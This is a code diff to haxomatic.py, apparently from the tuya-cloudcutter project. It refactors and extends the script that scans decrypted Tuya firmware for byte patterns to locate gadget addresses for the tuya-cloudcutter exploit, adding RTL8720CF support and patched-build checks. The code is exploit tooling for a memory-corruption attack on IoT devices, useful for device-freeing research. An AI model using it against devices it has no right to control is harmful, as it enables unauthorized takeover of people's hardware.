@@ -1,11 +1,18 @@
 import os.path
 import sys
+from enum import IntEnum
+
+
+class AddressSize(IntEnum):
+    BEKEN = 3
+    RTL8720CF = 4
 
 
 class CodePatternFinder(object):
-    def __init__(self, code: bytes, base_address: int = 0):
+    def __init__(self, code: bytes, base_address: int = 0, start_offset = 0x10000):
         self.code = code
         self.base_address = base_address
+        self.start_offset = start_offset
 
     def bytecode_search(self, bytecode: bytes, stop_at_first: bool = True):
         offset = self.code.find(bytecode, 0)
@@ -27,7 +34,7 @@ class CodePatternFinder(object):
     def set_final_thumb_offset(self, address):
         # Because we're only scanning the app partition, we must add the offset for the bootloader
         # Also add an offset of 1 for the THUMB
-        return address + 0x10000 + 1
+        return address + self.start_offset + 1
 
 
 def name_output_file(desired_appended_name):
@@ -48,7 +55,7 @@ def walk_app_code():
         # 3 matches, 2nd is correct
         # 2b 68 30 1c 98 47 is the byte pattern for finish addess
         # 1 match should be found
-        process_generic("BK7231T", "SDK 2.0.0 8710_2M", "datagram", 0, "041e2cd1119b", 1, 0, "2b68301c9847", 1, 0)
+        process_beken("BK7231T", "SDK 2.0.0 8710_2M", "datagram", 0, "041e2cd1119b", 1, 0, "2b68301c9847", 1, 0)
         return
 
     # Older versions of BK7231T, BS version 30.05/30.06, SDK 2.0.0
@@ -57,7 +64,7 @@ def walk_app_code():
         # 3 matches, 2nd is correct
         # 2b 68 30 1c 98 47 is the byte pattern for finish addess
         # 1 match should be found
-        process_generic("BK7231T", "SDK 2.0.0 8710_2M", "datagram", 0, "041e07d1119b211c00", 3, 1, "2b68301c9847", 1, 0)
+        process_beken("BK7231T", "SDK 2.0.0 8710_2M", "datagram", 0, "041e07d1119b211c00", 3, 1, "2b68301c9847", 1, 0)
         return
 
     # Newer versions of BK7231T, BS 40.00, SDK 1.0.x, nobt
@@ -66,7 +73,7 @@ def walk_app_code():
         # 1 match should be found
         # 23 68 38 1c 98 47 is the byte pattern for finish addess
         # 2 matches should be found, 1st is correct
-        process_generic("BK7231T", "SDK 1.0.# nobt", "datagram", 0, "b54f061e07d1", 1, 0, "2368381c9847", 2, 0)
+        process_beken("BK7231T", "SDK 1.0.# nobt", "datagram", 0, "b54f061e07d1", 1, 0, "2368381c9847", 2, 0)
         return
 
     # Newer versions of BK7231T, BS 40.00, SDK 1.0.x
@@ -75,7 +82,7 @@ def walk_app_code():
         # 1 match should be found
         # 23 68 38 1c 98 47 is the byte pattern for finish addess
         # 2 matches should be found, 1st is correct
-        process_generic("BK7231T", "SDK 1.0.#", "datagram", 0, "a14f061e", 1, 0, "2368381c9847", 2, 0)
+        process_beken("BK7231T", "SDK 1.0.#", "datagram", 0, "a14f061e", 1, 0, "2368381c9847", 2, 0)
         return
 
     # Newer versions of BK7231T, BS 40.00, SDK 2.3.0
@@ -85,7 +92,7 @@ def walk_app_code():
         # 7b 69 20 1c 98 47 is the byte pattern for finish addess
         # 1 match should be found, 1st is correct
         # Padding offset of 20 is the only one available in this SDK, instead of the usual 4 for SSID.
-        process_generic("BK7231T", "SDK 2.3.0", "ssid", 20, "041e08d14d4b", 1, 0, "7b69201c9847", 1, 0)
+        process_beken("BK7231T", "SDK 2.3.0", "ssid", 20, "041e08d14d4b", 1, 0, "7b69201c9847", 1, 0)
         return
 
     # Newest versions of BK7231T, BS 40.00, SDK 2.3.2
@@ -95,7 +102,7 @@ def walk_app_code():
         # bb 68 20 1c 98 47 is the byte pattern for finish address
         # 1 match should be found, 1st is correct
         # Padding offset of 8 is the only one available in this SDK, instead of the usual 4 for SSID.
-        process_generic("BK7231T", "SDK 2.3.2", "ssid", 8, "041e00d10ce7", 1, 0, "bb68201c9847", 1, 0)
+        process_beken("BK7231T", "SDK 2.3.2", "ssid", 8, "041e00d10ce7", 1, 0, "bb68201c9847", 1, 0)
         return
 
     # BK7231N, BS 40.00, SDK 2.3.1, CAD 1.0.3
@@ -108,7 +115,7 @@ def walk_app_code():
         # 1 match should be found
         # 43 68 20 1c 98 47 is the byte pattern for finish address
         # 1 match should be found
-        process_generic("BK7231N", "SDK 2.3.1", "ssid", 4, "051e00d115e7", 1, 0, "4368201c9847", 1, 0)
+        process_beken("BK7231N", "SDK 2.3.1", "ssid", 4, "051e00d115e7", 1, 0, "4368201c9847", 1, 0)
         return
 
     # BK7231N, BS 40.00, SDK 2.3.3, CAD 1.0.4
@@ -117,7 +124,7 @@ def walk_app_code():
         # 1 match should be found
         # 43 68 20 1c 98 47 is the byte pattern for finish address
         # 1 match should be found
-        process_generic("BK7231N", "SDK 2.3.3 LAN 3.3/CAD 1.0.4", "ssid", 4, "051e00d113e7", 1, 0, "4368201c9847", 1, 0)
+        process_beken("BK7231N", "SDK 2.3.3 LAN 3.3/CAD 1.0.4", "ssid", 4, "051e00d113e7", 1, 0, "4368201c9847", 1, 0)
         return
 
     # BK7231N, BS 40.00, SDK 2.3.3, CAD 1.0.5
@@ -126,7 +133,7 @@ def walk_app_code():
         # 1 match should be found
         # 43 68 20 1c 98 47 is the byte pattern for finish address
         # 1 match should be found
-        process_generic("BK7231N", "SDK 2.3.3 LAN 3.4/CAD 1.0.5", "ssid", 4, "051e00d1fce6", 1, 0, "4368201c9847", 1, 0)
+        process_beken("BK7231N", "SDK 2.3.3 LAN 3.4/CAD 1.0.5", "ssid", 4, "051e00d1fce6", 1, 0, "4368201c9847", 1, 0)
         return
 
     # TuyaOS V3+, patched
@@ -136,6 +143,10 @@ def walk_app_code():
         print("==============================================================================================================")
         print("[!] The binary supplied appears to be patched and no longer vulnerable to the tuya-cloudcutter exploit.")
         print("==============================================================================================================")
+        return
+    
+    if b'\x002.3.0\x00' in appcode and b'AmebaZII' in appcode:
+        process_rtl8720cf("RTL8720CF", "SDK 2.3.0", "ssid", 4, "5c223a25647d", 2, 0, "passwd", 2, "65fd286010b3", 1, 0, "26fa3bf08cfaf2", 1, 0)
         return
 
     raise RuntimeError('Unknown pattern, please open a new issue and include the bin.')
@@ -158,12 +169,35 @@ def check_for_patched(known_patch_pattern):
     return False
 
 
-def process_generic(chipset, pattern_version, payload_type, payload_padding, payload_string, payload_count, payload_index, finish_string, finish_count, finish_index):
+def find_payload(matcher, addr_size : int, type, padding, bytecode_string, count, index):
+    print(f"[+] Searching for {type}[{padding}] payload address")
+    bytecode = bytes.fromhex(bytecode_string)
+    matches = matcher.bytecode_search(bytecode, stop_at_first=False)
+    if not matches or len(matches) != count:
+        raise RuntimeError(f"[!] Failed to find {type}[{padding}] payload address (found {len(matches)}, expected {count})")
+    addr = matcher.set_final_thumb_offset(matches[index])
+    for b in addr.to_bytes(addr_size, byteorder='little'):
+        if b == 0:
+            if type == "finish" and count > 0:
+                print(f"[!] Preferred {type} address contained a null byte, using available alternative")
+                addr = matcher.set_final_thumb_offset(matches[index + 1])
+            else:
+                raise RuntimeError(f"[!] {type} address contains a null byte, unable to continue")
+    print(f"[+] {type} payload address gadget (THUMB): 0x{addr:X}")
+    
+    with open(name_output_file(f'address_{type}.txt'), 'w') as f:
+        f.write(f'0x{addr:X}')
+    if padding > 0:
+        with open(name_output_file(f'address_{type}_padding.txt'), 'w') as f:
+            f.write(f"{padding}")
+
+
+def process_beken(chipset, sdk_identifier, payload_type, payload_padding, payload_string, payload_count, payload_index, finish_string, finish_count, finish_index):
     with open(name_output_file('chip.txt'), 'w') as f:
         f.write(f'{chipset}')
 
-    matcher = CodePatternFinder(appcode, 0x0)
-    print(f"[+] Matched pattern for {chipset} version {pattern_version}, payload type {payload_type}")
+    matcher = CodePatternFinder(appcode, 0x0, 0x10000)
+    print(f"[+] Matched pattern for {chipset} version {sdk_identifier}, payload type {payload_type}")
 
     patch_patterns = [
         "2d6811226b1dff33181c00210393", # BK7231N short/combined
@@ -175,46 +209,32 @@ def process_generic(chipset, pattern_version, payload_type, payload_padding, pay
         if check_for_patched(patch_pattern):
             return
 
-    print(f"[+] Searching for {payload_type} payload address")
-    payload_bytecode = bytes.fromhex(payload_string)
-    payload_matches = matcher.bytecode_search(payload_bytecode, stop_at_first=False)
-    if not payload_matches or len(payload_matches) != payload_count:
-        raise RuntimeError(f"[!] Failed to find {payload_type} payload address (found {len(payload_matches)}, expected {payload_count})")
-    payload_addr = matcher.set_final_thumb_offset(payload_matches[payload_index])
-    for b in payload_addr.to_bytes(3, byteorder='little'):
-        if b == 0:
-            raise RuntimeError(f"[!] {payload_type} payload address contains a null byte, unable to continue")
-    print(f"[+] {payload_type} payload address gadget (THUMB): 0x{payload_addr:X}")
+    find_payload(matcher, AddressSize.BEKEN, payload_type, payload_padding, payload_string, payload_count, payload_index)
+    find_payload(matcher, AddressSize.BEKEN, "finish", 0, finish_string, finish_count, finish_index)
 
-    print("[+] Searching for finish address")
-    finish_bytecode = bytes.fromhex(finish_string)
-    finish_matches = matcher.bytecode_search(finish_bytecode, stop_at_first=False)
-    if not finish_matches or len(finish_matches) > finish_count:
-        raise RuntimeError("[!] Failed to find finish address")
-    finish_addr = matcher.set_final_thumb_offset(finish_matches[finish_index])
-    for b in finish_addr.to_bytes(3, byteorder='little'):
-        if b == 0:
-            if finish_count > 0:
-                print("[!] Preferred finish address contained a null byte, using available alternative")
-                finish_addr = matcher.set_final_thumb_offset(finish_matches[finish_index + 1])
-            else:
-                raise RuntimeError("[!] Finish address contains a null byte, unable to continue")
-    print(f"[+] Finish address gadget (THUMB): 0x{finish_addr:X}")
 
-    with open(name_output_file('address_finish.txt'), 'w') as f:
-        f.write(f'0x{finish_addr:X}')
+def process_rtl8720cf(chipset, sdk_identifier,
+                      payload1_type, payload1_padding, payload1_string, payload1_count, payload1_index,
+                      payload2_type, payload2_padding, payload2_string, payload2_count, payload2_index,
+                      finish_string, finish_count, finish_index):
+    with open(name_output_file('chip.txt'), 'w') as f:
+        f.write(f'{chipset}')
 
-    if payload_type == "datagram":
-        with open(name_output_file('address_datagram.txt'), 'w') as f:
-            f.write(f'0x{payload_addr:X}')
-    elif payload_type == "ssid":
-        with open(name_output_file('address_ssid.txt'), 'w') as f:
-            f.write(f'0x{payload_addr:X}')
-        with open(name_output_file('address_ssid_padding.txt'), 'w') as f:
-            f.write(f'{payload_padding}')
-    elif payload_type == "passwd":
-        with open(name_output_file('address_passwd.txt'), 'w') as f:
-            f.write(f'0x{payload_addr:X}')
+    matcher = CodePatternFinder(appcode, 0x9b000000, 0x0) # TODO: verify base_address/offset
+    combined_payload_type = f"{payload1_type}[{payload1_padding}] + {payload2_type}[{payload2_padding}]"
+    print(f"[+] Matched pattern for {chipset} version {sdk_identifier}, payload type {combined_payload_type}")
+
+    patch_patterns = [
+        "d9f80060112206f5827b", # RTL8720CF 2.3.3 Patched BUILD AT:2023_05_16_18_19_54
+    ]
+
+    for patch_pattern in patch_patterns:
+        if check_for_patched(patch_pattern):
+            return
+
+    find_payload(matcher, int(AddressSize.RTL8720CF), payload1_type, payload1_padding, payload1_string, payload1_count, payload1_index)
+    find_payload(matcher, int(AddressSize.RTL8720CF), payload2_type, payload2_padding, payload2_string, payload2_count, payload2_index)
+    find_payload(matcher, int(AddressSize.RTL8720CF), "finish", 0, finish_string, finish_count, finish_index)
 
 
 def run(decrypted_app_file: str):
@@ -222,7 +242,8 @@ def run(decrypted_app_file: str):
         print('Usage: python haxomatic.py <app code file>')
         sys.exit(1)
 
-    address_finish_file = decrypted_app_file.replace('_app_1.00_decrypted.bin', '_address_finish.txt')
+    #address_finish_file = decrypted_app_file.replace('_app_1.00_decrypted.bin', '_address_finish.txt')
+    address_finish_file = decrypted_app_file.replace('.bin', '_address_finish.txt')
     if os.path.exists(address_finish_file):
         print('[+] Haxomatic has already been run')
         return
